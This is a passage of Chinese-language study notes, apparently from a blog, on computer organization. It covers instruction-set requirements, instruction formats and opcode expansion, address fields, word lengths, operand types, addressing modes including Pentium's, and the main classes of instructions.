。</p><p><code>指令系统</code>是表征计算机性能的重要因素，它的格式与功能不仅直接影响到机器的硬件结构，而且也直接影响到系统软件，影响到机器的适用范围。</p><p><code>复杂指令系统计算机</code>，简称<code>CISC</code><br><code>精简指令系统计算机</code>，简称<code>RISC</code></p><h3 id="指令系统的性能要求"><a href="#指令系统的性能要求" class="headerlink" title="指令系统的性能要求"></a>指令系统的性能要求</h3><p>一个<code>完善的指令系统</code>应满足以下四方面的要求：</p><ol><li>完备性<br>用汇编语言编写各种程序时，<code>指令系统直接提供的指令足够使用</code>，而不必用软件来实现。要求指令系统丰富、功能齐全、使用方便。<br><code>一台计算机中最基本、必不可少的指令是不多的</code>。许多指令可用最基本的指令编程来实现。例如，乘除运算指令、浮点运算指令可直接用硬件来实现，也可用基本指令编写的程序来实现。采用硬件指令的目的是提高程序执行速度，便于用户编写程序</li><li>有效性<br>利用该指令系统所编写的程序能够高效率地运行。高效率主要表现在<code>程序占据存储空间小、执行速度快</code><br>一般来说，一个功能更强、更完善的指令系统，必定有更好的有效性</li><li>规整性<br>包括指令系统的<code>对称性</code>、<code>匀齐性</code>、<code>指令格式</code>和<code>数据格式</code>的一致性。<br><code>对称性</code>：在指令系统中所有的寄存器和存储器单元都可同等对待，所有的指令都可使用各种寻址方式；<br><code>匀齐性</code>：一种操作性质的指令可以支持各种数据类型，如算术运算指令可支持字节、字、双字整数的运算，十进制数运算和单、双精度浮点数运算等；<br><code>指令格式和数据格式的一致性</code>：指令长度和数据长度有一定的关系，以方便处理和存取。例如<code>指令长度和数据长度通常是字节长度的整数倍</code>。</li><li>兼容性<br>系列机各机种之间具有相同的基本结构和共同的基本指令集，因而指令系统是兼容的，即各机种上基本软件可以通用。<br>但由于不同机种推出的时间不同，在结构和性能上有差异，做到所有软件都完全兼容是不可能的，只能做到<code>“向上兼容”</code>，即<code>低档机上运行的软件可以在高档机上运行</code>。</li></ol><h3 id="低级语言与硬件结构的关系"><a href="#低级语言与硬件结构的关系" class="headerlink" title="低级语言与硬件结构的关系"></a>低级语言与硬件结构的关系</h3><p>计算机能够直接识别和执行的唯一语言是<code>二进制机器语言</code>，因此，必须借助<code>汇编程序或编译程序</code>，把<code>符号语言或高级语言</code>翻译成<code>二进制码组成的机器语言</code>。</p><p>汇编语言依赖于计算机的硬件结构和指令系统。不同的机器有不同的指令，所以<code>用汇编语言编写的程序不能在其他类型的机器上运行</code>。</p><h2 id="指令格式"><a href="#指令格式" class="headerlink" title="指令格式"></a>指令格式</h2><p><code>影响计算机指令格式的因素</code>：机器的字长、存储器的容量、指令的功能等<br>一条指令应包含如下信息：</p><ol><li>进行何种操作：即操作性质，体现在指令中被称为<code>操作码</code>。</li><li>操作的对象：数据来源以及如何寻找操作数。</li><li>操作结果：结果存放在何处。</li><li>下一条指令又如何寻找。</li></ol><p>后三项信息体现在指令中被统称为<code>地址码</code>，因此指令由操作码和地址码两部分组成，它的基本格式如下：</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F.png" class=""><h3 id="操作码"><a href="#操作码" class="headerlink" title="操作码"></a>操作码</h3><p>操作码是说明指令操作性质的二进制代码，如进行加法、减法、乘法、除法、取数、存数等<br>不同的指令用操作码字段的不同编码表示，CPU中有专门的电路来解释每个操作码</p><p>操作码所占的二进制位数决定了一台计算机所能允许的指令条数。<br>例如：操作码占用六位二进制码时，这台计算机最多允许有：<br>2^6 ＝ 64 条指令</p><p><strong>操作码字段分两种：</strong></p><ol><li>固定长度操作码<br>操作码所占的二进制位数固定不变，集中放置在指令字的一个字段中。<br>这种格式有利于<code>简化硬件设计</code>，<code>减少指令译码时间</code>，广泛用于字长较长的大、中型计算机和超级小型计算机中。</li><li>可变长度操作码<br>操作码扩展技术的应用，即操作码的长度是可变的，且分散地放在指令的不同字段中。<br>这种格式<code>有利于压缩程序中操作码的平均长度</code>，在字长较短的微型机中被广泛应用。<br>下面是一种扩展操作码的安排示意：<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%89%A9%E5%B1%95%E6%93%8D%E4%BD%9C%E7%A0%81.png" class="">这是一个16位字长的指令码，包括4位基本操作码字段和三个4位长的地址字段。4位基本操作码，若全部用于三地址指令，则有16条。<br>显然，4位基本操作码是不够的，必须向地址码字段扩展操作作码的长度。其扩展方法及步骤如下：<br>1). 15条三地址指令的操作码由4位基本操作码<code>0000~1110</code>所给定，剩下一个1111则用于把操作码扩展到A1地址码字段，即由4位扩展到8位； <img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/15%E6%9D%A1%E4%B8%89%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class="">2). 14条二地址指令的操作码由8位操作码的<code>1111,0000～1111</code>,1101给定，剩下的1111,1110和1111,1111又可用于把操作码扩充到A2地址字段，即从8位又扩充到12位；        <img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/14%E6%9D%A1%E4%BA%8C%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class="">3). 31条一地址指令的操作码由12位操作码的<code>1111,1110,0000 ~ 1111,1111,1110</code>给定。<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/31%E6%9D%A1%E4%B8%80%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class="">4). 由此类堆，还可以把剩下的<code>1111,1111,1111</code>扩充到A3地址码字段而形成16位操作码，这时还可由<code>1111,1111,1111,0000~1111,1111,1111,1111</code>给出16条零地址指令<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/16%E6%9D%A1%E9%9B%B6%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class="">采用这种方法，指令系统中共有15+14+31+16=76条指令</li></ol><p>上述方法是在不增加指令长度的情况下，采用对地址少的指令使用较长的操作码，对地址数多的指令使用较短的操作码。其实质是增加了指令的数量，丰富了指令的功能</p><p>在可变长操作码的指令系统设计中，究竟使用何种扩展方法为好？<br>指令的<code>使用频度</code>（即在程序中出现的概率）是非常重要的依据。即<code>频度高的指令应分配短的操作码，频度低的指令则分配较长的操作码</code>。这样，既可有效地缩短操作码在程序中的平均长度，节省存储空间，又可缩短常用指令的译码时间以提高程序的运行速度。<br>其<code>缺点</code>是译码系统比固定操作码复杂，增加了设计控制器的难度，需要更多的硬件作支持</p><h3 id="地址码"><a href="#地址码" class="headerlink" title="地址码"></a>地址码</h3><p>指令中的地址码用来指出该指令的<code>源操作数地址</code>（一个或两个）、<code>结果地址</code>及<code>下一条指令的地址</code><br>这里的地址可以是<code>主存地址</code>，也可以是<code>寄存器地址</code>，甚至可以是<code>I/O设备的地址</code></p><h4 id="四地址指令"><a href="#四地址指令" class="headerlink" title="四地址指令"></a>四地址指令</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%9B%9B%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class=""><p><code>OP</code>：操作码；<code>A1</code>：第一地址码，存放第一操作数；<code>A2</code>：第二地址码，存放第二操作数；<code>A3</code>：第三地址码，存放操作结果；<code>A</code>4：第四地址码，存放下条要执行指令的地址<br>操作：<code>（A1）OP（A2）→ A3</code><br>这种指令<code>直观易懂</code>，后续指令的地址可任意填写<br>可直接寻址的地址范围与地址字段的<code>位数有关</code></p><h4 id="三地址指令"><a href="#三地址指令" class="headerlink" title="三地址指令"></a>三地址指令</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%89%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class=""><p>由于采用了<code>程序计数器</code>（简称PC），省去了A4地址；<br>用三地址指令编写的程序，其指令在内存中<code>必须依次存放</code>，才能利用<code>程序计数器自动增量</code>的办法顺序执行。若程序要转向时，必须用<code>转移指令改变程序的执行顺序</code></p><h4 id="二地址指令"><a href="#二地址指令" class="headerlink" title="二地址指令"></a>二地址指令</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%BA%8C%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class=""><p><code>OP</code>：操作码；<code>A1</code>：既做第一操作数地址，又做目的地址；<code>A2</code>：第二操作数地址。<br>操作：<code>（A1） OP（A2） → A1</code><br>在不改变字长和操作码位数的前提下，二地址指令可直接访问的主存地址数为：<code>2^12=4K</code><br>使用二地址指令编写的程序，其指令在内存中也要<code>依次存放</code>，才能用程序计数器自动增量使之顺序执行。若程序发生转向时，也必须用转移指令改变程序的执行顺序。<br>当二地址指令执行之后，<code>A1中的内容被修改</code>了</p><h4 id="一地址指令"><a href="#一地址指令" class="headerlink" title="一地址指令"></a>一地址指令</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4.png" class=""><p>指令中只给出一个操作数地址，另一个操作数地址和目的地址则是<code>隐含</code>的。这个隐含的地址就是<code>运算器的累加寄存器AC</code><br>操作：<code>（AC）OP（A）→ AC</code><br>在不改变字长和操作码位数的前提下，二地址指令可直接访问的主存地址数为：   <code>2^24 = 16M</code><br>完成一条指令只需<code>两次访存</code><br>采用一地址指令编写的程序，其指令在内存中也要顺序存放，由程序计数器自动增量控制其顺序执行。程序转向时，也用转移指令改变程序的执行方向。</p><p>在程序执行前，必须用一条“取数指令”把其中一个操作数放到累加寄存器中。程序结束后，累加寄存器的内容已被修改。若要将累加寄存器中的结果送回内存，则必须使用“存数指令”</p><h4 id="零地址指令"><a href="#零地址指令" class="headerlink" title="零地址指令"></a>零地址指令</h4><p>只有操作码，没有地址码的指令称为零地址指令。如停机指令。</p><hr><p>在二地址指令格式中，从<code>操作数的物理位置</code>来分，指令可以分为三种类型： </p><ol><li><code>存储器-存储器（SS）型指令</code><br>指令操作中涉及的操作数都在内存单元中，操作结果也保存在内存中。执行这类指令需要多次访存。</li><li><code>寄存器-寄存器（RR）型指令</code><br>指令操作中涉及的操作数都在寄存器中，操作结果也保存在寄存器中。执行这类指令不需要访问存储器，速度很快。</li><li><code>寄存器-存储器（RS）型指令</code><br>执行这类指令时，既要访问内存单元，又要访问寄存器。</li></ol><h3 id="指令字长度"><a href="#指令字长度" class="headerlink" title="指令字长度"></a>指令字长度</h3><h4 id="机器字长"><a href="#机器字长" class="headerlink" title="机器字长"></a>机器字长</h4><p>机器字的长度简称<code>字</code>长，指计算机能<code>直接处理的二进制数据的位数</code>。<br>字长是计算机中的一项重要技术指标，字长越长，计算机的运算精度越高；<br>字长还能反映指令的寻址能力，若字长n位全用来寻址，可直接寻址2^n个字节。<br>一般把机器字长定为字节长度（8位）的整数倍</p><h4 id="指令字长"><a href="#指令字长" class="headerlink" title="指令字长"></a>指令字长</h4><p>指令字的长度指一个指令字中包含的二进制代码的位数，取决于<code>操作码的长度</code>、<code>操作数地址的长度</code>和<code>操作数地址的个数</code><br>指令字的长度也定为字节长度的整数倍</p><h4 id="指令字长与机器字长的关系"><a href="#指令字长与机器字长的关系" class="headerlink" title="指令字长与机器字长的关系"></a>指令字长与机器字长的关系</h4><p>指令字长度与机器字长度<code>没有固定的关系</code>，它可以等于机器字长，也可以大于或小于机器字长</p><ol><li>指令字长度等于机器字长度的指令，称为<code>单字长指令</code></li><li>指令字长等于两个机器字长的指令，称为<code>双字长指令</code></li><li>指令字长度只有半个机器字长度的指令，称为<code>半字长指令</code></li></ol><hr><ol><li>等字长指令结构<br>在同一个指令系统中，所有的指令字长度都是相等的，称为等字长指令字结构， 这种指令字结构简单，控制方便</li><li>变字长指令结构<br>如果<code>各种指令字长度随指令的功能而变化</code>，如有的指令是单字长指令，有的指令是双字长指令或三字长指令，则称为变字长指令结构，这种指令字结构灵活，能<code>充分利用指令字长度，但指令的控制较复杂</code></li></ol><h3 id="指令助记符"><a href="#指令助记符" class="headerlink" title="指令助记符"></a>指令助记符</h3><p>由于硬件只能识别1和0，所以采用二进制操作码是必要的，但是用二进制来书写程序却非常麻烦。<br>为了便于书写和阅读程序，每条指令通常用3个或4个英文缩写字母来表示。这种缩写码叫做<code>指令助记符</code>：</p><h2 id="操作数类型"><a href="#操作数类型" class="headerlink" title="操作数类型"></a>操作数类型</h2><p>机器指令对数据进行操作，数据通常分以下四类：</p><ol><li><code>地址数据</code>：<br>多数情况下，对指令中操作数的引用必须完成某种计算，才能确定它们在主存中的有效地址，此时，地址被看成无符号整数。</li><li><code>数值数据</code>：<br>定点整数或定点小数、浮点数、压缩BCD码。 </li><li><code>字符数据</code>：<br>也称文本数据或字符串，目前广泛使用ASCII码。 </li><li><code>逻辑数据</code>：<br>一个单元中有几位二进制位项组成，每位的值可以是1或0。当数据以这种方式看待时，称为逻辑性数据</li></ol><h2 id="指令和数据的寻址方式"><a href="#指令和数据的寻址方式" class="headerlink" title="指令和数据的寻址方式"></a>指令和数据的寻址方式</h2><p>存储器既可以存放数据又可以存放指令。因此当某个操作数或某条指令存放在某个存储单元时，其存储单元的编号，就是该操作数或指令在存储器中的地址。</p><p>当采用地址指定方式时，形成操作数或指令地址的方式，称为<code>寻址方式</code><br>寻址方式分为两类，即<code>指令寻址方式</code>和<code>数据寻址方式</code>，前者比较简单，后者比较复杂</p><h3 id="指令的寻址方式"><a href="#指令的寻址方式" class="headerlink" title="指令的寻址方式"></a>指令的寻址方式</h3><p>指令的寻址方式有两种，一种是<code>顺序寻址方式</code>，另一种是<code>跳跃（转移）寻址方式</code></p><h4 id="顺序寻址方式"><a href="#顺序寻址方式" class="headerlink" title="顺序寻址方式"></a>顺序寻址方式</h4><p>指令地址在内存中按顺序安排，当执行一段程序时，通常是一条指令接一条指令的顺序执行<br>从存储器取出第一条指令，然后执行这条指令；接着从存储器取出第二条指令，再执行第二条指令；接着再取出第三条指令……这种程序顺序执行的过程，我们称为<code>指令的顺序寻址方式</code><br>必须使用<code>程序计数器（又称指令指针寄存器）PC</code>来计数指令的顺序号，该顺序号就是指令在内存中的地址</p><h4 id="转移寻址方式"><a href="#转移寻址方式" class="headerlink" title="转移寻址方式"></a>转移寻址方式</h4><p>当程序转移执行的顺序时，指令的寻址就采取转移寻址方式<br>所谓转移，是指<code>下条指令的地址码不是由程序计数器给出，而是由本条指令给出</code><br>程序转移后，按新的指令地址开始顺序执行。<code>指令计数器的内容也必须相应改变</code>，以便及时跟踪新的指令地址。</p><p>采用<code>指令转移寻址方式</code>，可以<code>实现程序转移或构成循环程序</code>，从而能缩短程序长度，或将某些程序作为公共程序引用。<code>指令系统中的各种条件转移或无条件转移指令</code>，就是为了实现指令的转移寻址而设置的</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E6%8C%87%E4%BB%A4%E7%9A%84%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.png" class=""><h3 id="操作数基本寻址方式"><a href="#操作数基本寻址方式" class="headerlink" title="操作数基本寻址方式"></a>操作数基本寻址方式</h3><p>操作数的寻址就是寻找操作数的地址，其目的是<code>寻找所需要的操作数</code><br><code>寻址方式</code>就是<code>形成操作数的有效地址的方法</code><br><strong>一种单地址指令的结构</strong></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E4%B8%80%E7%A7%8D%E5%8D%95%E5%9C%B0%E5%9D%80%E6%8C%87%E4%BB%A4%E7%9A%84%E7%BB%93%E6%9E%84.png" class=""><p>指令中<code>操作数字段的地址码</code>是由<code>形式地址A</code>和<code>寻址方式特征位</code>等组合形成；<br>一般来说，指令中所给出的地址码，并不是操作数的<code>有效地址</code><br><code>形式地址A</code>，也称<code>偏移量</code>，是<code>指令字结构中给定的地址量</code><br><code>寻址方式特征位</code>由<code>间址位</code>和<code>变址位</code>组成:</p><ol><li>如果这条指令无间址和变址的要求，则形式地址就是操作数的有效地址</li><li>如果指令中指明要间址或变址变换，则形式地址要经过指定方式的变换，才能形成有效地址</li></ol><p>寻址过程就是把操作数的形式地址，变换为操作数的有效地址的过程</p><h4 id="隐含寻址"><a href="#隐含寻址" class="headerlink" title="隐含寻址"></a>隐含寻址</h4><p>在指令中不明显地给出操作数的地址，其操作数或操作数的地址隐含在某个通用寄存器中或指定的存储单元中</p><p>例如：单地址的指令格式，没有在地址字段中指明第二操作数地址，而是规定累加寄存器AC作为第二操作数地址，AC对单地址指令格式来说是隐含地址。</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E9%9A%90%E5%90%AB%E5%AF%BB%E5%9D%80.png" class=""><p>这种方式可以缩短指令的长度，在字长较短的微型机或小型机中被广泛采用</p><h4 id="立即寻址"><a href="#立即寻址" class="headerlink" title="立即寻址"></a>立即寻址</h4><p>所需的操作数由指令直接给出，称为立即数寻址方式，简称<code>立即寻址</code></p><p>特点：</p><ol><li>取指令时将操作码和一个操作数同时取出，不必再次访问存储器，提高了指令的执行速度。</li><li>操作数是指令的一部分，不能被修改。</li><li>对于定长指令格式，操作数的大小将受到指令长度的限制，所以这种寻址方式灵活性最差。</li><li>通常用于给某一寄存器或主存单元赋初值，或者用于提供一个常数。</li><li>在微型和小型计算机中，内存是按字节编址的。对立即寻址而言，若前一个字节是操作码，紧跟着的第二个字节就是立即操作数。因此，立即数寻址又称为邻接型寻址，或者说，操作数紧跟着操作码<img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E7%AB%8B%E5%8D%B3%E5%AF%BB%E5%9D%80.png" class=""></li></ol><h4 id="直接寻址"><a href="#直接寻址" class="headerlink" title="直接寻址"></a>直接寻址</h4><p>在指令格式的地址字段中直接指出操作数在内存的地址A。采用直接寻址时，指令字中的形式地址A就是操作数的有效地址EA<br>用D表示操作数，则：<code>D =（A）</code><br>操作数地址是不能修改的，与程序本身所在的位置无关，所以又叫做<code>绝对寻址方式</code></p><h4 id="间接寻址"><a href="#间接寻址" class="headerlink" title="间接寻址"></a>间接寻址</h4><p>指令地址字段中的形式地址A不是操作数D的真正地址，而是存放操作数地址的主存单元的地址，简称<code>操作数地址的地址</code><br>操作数的有效地址的计算公式为：<code>EA =(A)，D =(EA)=((A))</code></p><p><strong>特点：</strong><br>因为操作数的有效地址在主存储器中，可以被灵活的修改而不必修改指令，从而使<code>间接寻址要比直接寻址灵活得多</code>。<br>但是，间接寻址在指令执行过程中<code>至少需要两次访问主存储器</code>才能取出操作数，严重降低了指令执行的速度</p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80.png" class=""><h5 id="寄存器寻址"><a href="#寄存器寻址" class="headerlink" title="寄存器寻址"></a>寄存器寻址</h5><p>指令中给出的操作数地址不是内存的地址单元号，而是通用寄存器的编号：<code>EA=R，D =(R)</code></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AF%84%E5%AD%98%E5%99%A8%E5%AF%BB%E5%9D%80.png" class=""><p><strong>优点：</strong></p><ol><li>由于寄存器在CPU的内部，指令在执行时从寄存器中取操作数比访问主存要快得多； </li><li>由于寄存器的数量较少，因此寄存器编号所占位数也较少，从而可以有效减少指令的地址码字段的长度</li></ol><h4 id="寄存器间接寻址"><a href="#寄存器间接寻址" class="headerlink" title="寄存器间接寻址"></a>寄存器间接寻址</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%AF%84%E5%AD%98%E5%99%A8%E9%97%B4%E6%8E%A5%E5%AF%BB%E5%9D%80.png" class=""><p>即将操作数放在主存储器中，而操作数的地址放在某一通用寄存器中，然后在指令的地址码部分给出该通用寄存器的编号，这时有<code>EA =(R)</code><br>这种寻址方式的指令较短，并且在取指后只需一次访存便可得到操作数，因此指令执行速度较间接寻址方式要快，也是目前在计算机中使用较为广泛的一种寻址方式。 </p><h4 id="偏移寻址"><a href="#偏移寻址" class="headerlink" title="偏移寻址"></a>偏移寻址</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%81%8F%E7%A7%BB%E5%AF%BB%E5%9D%80.png" class=""><p>直接寻址和寄存器间接寻址方式的结合<br>有效地址计算公式为<code>EA = A +(R)</code></p><p>要求指令中有两个地址字段，一个地址字段中的形式地址A直接被使用；另一个地址字段指的是某个专用寄存器。<br>此寄存器的内容加上形式地址A就产生有效地址EA。<br>常用的三种偏移寻址是<code>相对寻址</code>、<code>基址寻址</code>、<code>变址寻址</code></p><h5 id="相对寻址"><a href="#相对寻址" class="headerlink" title="相对寻址"></a>相对寻址</h5><p>程序计数器<code>PC的内容加上指令格式中的形式地址A而形成操作数的有效地址，EA = A +(PC)</code></p><p>程序计数器的内容就是<code>即将执行的下一条指令的地址</code>。“相对”寻址，就是相对于当前的指令地址而言</p><p>此时<code>形式地址A</code>通常称为偏移量，其值可正可负，相对于当前指令地址进行浮动。<br>使用相对寻址可以节省指令中的地址位数，也便于程序在内存中成块搬动</p><h5 id="基址寻址"><a href="#基址寻址" class="headerlink" title="基址寻址"></a>基址寻址</h5><p>当存储容量较大，所需地址码的长度大于字长时，指令中的地址码部分直接给出的地址不可能直接访问存储器的所有单元。因此，把整个存储空间分成若干段，每段的首地址存放在一个基址寄存器中，段内的位移量由指令直接给出。<br>于是，存储器的实际地址就等于基址寄存器的内容加上段内位移量。这就叫做<code>基址寄存器寻址方式</code>，简称<code>基址寻址</code><br>基址寄存器的位数可以设置得很长，从而可以在较大的存储空间中寻址。</p><h5 id="变址寻址"><a href="#变址寻址" class="headerlink" title="变址寻址"></a>变址寻址</h5><p>将指令中的基地址码和一个“变址值”相加后形成操作数的有效地址<br>“变址值”存放在一个专用的变址寄存器Ri中或专用的内存单元中</p><p>变址寻址的用途是为重复操作的完成提供一种高效机制。最典型的应用就是<code>将指令的地址码部分给出的地址A作为基准地址，而将变址寄存器Ri中的内容作为修改量。在遇到需要频繁修改操作数地址时，无须修改指令，只要修改Ri中的变址值就可以了，这对于数组运算、字符串操作等一些进行成批数据处理的指令是很有用的</code></p><hr><p><strong>基址和变址的应用方向</strong>    </p><ol><li><code>基址寻址面向系统</code>，主要用于逻辑地址到物理地址的变换，用来解决程序在主存储器中的再定位和扩大寻址空间等问题。在一些大型机中，基址寄存器是由管理程序利用特权指令来使用，用户程序无权修改它，从而确保了系统的安全性。</li><li><code>变址寻址则面向用户</code>，用于访问字符串、向量和数组等成批数据，没有逻辑地址到物理地址的变换功能</li></ol><h4 id="段寻址方式"><a href="#段寻址方式" class="headerlink" title="段寻址方式"></a>段寻址方式</h4><p>这个基地址就是CPU中的段寄存器<br>这种寻址方式的实质依然是基址寻址</p><h4 id="堆栈寻址"><a href="#堆栈寻址" class="headerlink" title="堆栈寻址"></a>堆栈寻址</h4><p>堆栈采用“先进后出”的工作方式</p><h5 id="串联堆栈-硬堆栈"><a href="#串联堆栈-硬堆栈" class="headerlink" title="串联堆栈(硬堆栈)"></a>串联堆栈(硬堆栈)</h5><p>在一些计算机的CPU中，设置有<code>8个或16个寄存器作为堆栈</code>，由于寄存器具有移位功能，压入（进栈）时，可以从顶部压入，依次移到下面的各个寄存器中；弹出（退栈）时，亦先由顶部寄存器取出，下面寄存器中的内容则逐个向上移动。因此，称为<code>串联堆栈</code></p><p>这种堆栈一般不要求堆栈指示器，由硬件支持，又称硬堆栈。这种堆栈通常设在CPU中，操作速度快。但它要受到寄存器数目的限制</p><h5 id="存储器堆栈-软堆栈"><a href="#存储器堆栈-软堆栈" class="headerlink" title="存储器堆栈(软堆栈)"></a>存储器堆栈(软堆栈)</h5><p>常用的堆栈是利用一部分主存区域，称为<code>存储器堆栈</code><br><code>存储器堆栈有如下优点：</code></p><ol><li>堆栈的长度可视程序的要求任意设置；</li><li>堆栈的数目可由程序员任意规定；</li><li>可使用对存储器寻址的任何一条指令来对堆栈中的数据进行寻址。</li></ol><p>用存储区设置的堆栈，其中的数据不能像硬堆栈那样一个单元向另一个单元移动。因此，采用堆栈顶部相对于数据进行移动的方法，在CPU中设置一个<code>堆栈指示器</code>来指示栈顶的移动情况。相应地，又把存储器堆栈称为<code>软堆栈</code><br>当软堆栈建立后，该部分存储区则不能再作他用。</p><hr><p><strong>基本寻址方式比较</strong></p><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E5%9F%BA%E6%9C%AC%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F%E6%AF%94%E8%BE%83.png" class=""><h3 id="Pentium的寻址方式"><a href="#Pentium的寻址方式" class="headerlink" title="Pentium的寻址方式"></a>Pentium的寻址方式</h3><h4 id="Pentium的工作模式"><a href="#Pentium的工作模式" class="headerlink" title="Pentium的工作模式"></a>Pentium的工作模式</h4><p><strong>实地址模式</strong><br>在实地址模式下，逻辑地址形式为段寻址方式:<br>将段名所指定的段寄存器内容（16位）左移4位，低4位补全0，得到20位段基地址，再加上段内偏移，即得20位物理地址</p><p><strong>保护虚拟地址模式</strong><br>在保护模式下，32位段基地址加上段内偏移得到32位线性地址。由存储管理部件将其转换成32位的物理地址</p><p>无论是实地址模式还是保护模式，段基地址的获取方式已是固定的方式。我们主要讨论<code>有效地址</code>的获取方式</p><h4 id="Pentium指令格式及寻址方式"><a href="#Pentium指令格式及寻址方式" class="headerlink" title="Pentium指令格式及寻址方式"></a>Pentium指令格式及寻址方式</h4><img src="/2020/06/10/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/Pentium%E6%8C%87%E4%BB%A4%E6%A0%BC%E5%BC%8F%E5%8F%8A%E5%AF%BB%E5%9D%80%E6%96%B9%E5%BC%8F.png" class=""><h2 id="典型指令"><a href="#典型指令" class="headerlink" title="典型指令"></a>典型指令</h2><h3 id="指令的分类"><a href="#指令的分类" class="headerlink" title="指令的分类"></a>指令的分类</h3><h4 id="数据传送类指令"><a href="#数据传送类指令" class="headerlink" title="数据传送类指令"></a>数据传送类指令</h4><p>实现寄存器与寄存器，寄存器与存储单元以及存储单元与存储单元之间的数据传送</p><p>数据传送指令主要包括<code>取数指令</code>、<code>存数指令</code>、<code>传送指令</code>、<code>成组传送指令</code>、<code>字节交换指令</code>、<code>清寄存器指令</code>、<code>堆栈操作指令</code>等等</p><h4 id="算术运算指令"><a href="#算术运算指令" class="headerlink" title="算术运算指令"></a>算术运算指令</h4><p>这类指令包括<code>二进制定点加、减、乘、除指令，浮点加、减、乘、除指令，求反、求补指令，算术移位指令，算术比较指令，十进制加、减运算指令等</code>。这类指令主要用于<code>定点或浮点的算术运算</code></p><h4 id="逻辑运算指令"><a href="#逻辑运算指令" class="headerlink" title="逻辑运算指令"></a>逻辑运算指令</h4><p>这类指令包<code>括逻辑加</code>、<code>逻辑乘</code>、<code>逻辑比较</code>、<code>测等指令</code>、<code>按位加</code>、<code>逻辑移位</code>等指令，主要用于<code>无符号数的位操作、代码的转换、判断及运算</code>。移位指令用来对寄存器的内容实现左移、右移或循环移位</p><h4 id="程序控制指令"><a href="#程序控制指令" class="headerlink" title="程序控制指令"></a>程序控制指令</h4><p><code>程序控制指令</code>也称<code>转移指令</code><br>程序控制指令也称转移指令。执行程序时，有时机器执行到某条指令时，出现了几种不同结果，这时机器必须执行一条转移指令，根据不同结果进行转移，从而改变程序原来执行的顺序。这种转移指令称为条件转移指令。</p><p>除各种<code>条件转移指令外，还有无条件转移指令、转子程序指令、返回主程序指令、中断返回指令</code>等。 转移指令的转移地址一般采用直接寻址和相对寻址方式来确定。</p><p><code>转子指令</code>是转向本指令操作地址所指出的子程序入口，并将原程序中下一条指令地址存入内存某单元（或指定的某个寄存器）中，以便为返回主程序时提供返回地址</p><h4 id="输入输出指令"><a href="#输入输出指令" class="headerlink" title="输入输出指令"></a>输入输出指令</h4><p>输入输出指令主要用来启动外围设备，检查测试外围设备的工作状态，并实现<code>外部设备和CPU之间，或外围设备与外围设备之间</code>的信息传送</p><h4 id="字符串处理指令"><a href="#字符串处理指令" class="headerlink" title="字符串处理指令"></a>字符串处理指令</h4><p>字符串处理指令是一种<code>非数值处理指令</code>，一般包括字符串传送、字符串转换（把一种编码的字符串转换成另一种编码的字符串）、字符串替换（把某一字符串用另一字符串替换）等。这类指令在文字编辑中对大量字符串进行处理</p><h4 id="陷阱（TRAP）指令"><a href="#陷阱（TRAP）指令" class="headerlink" 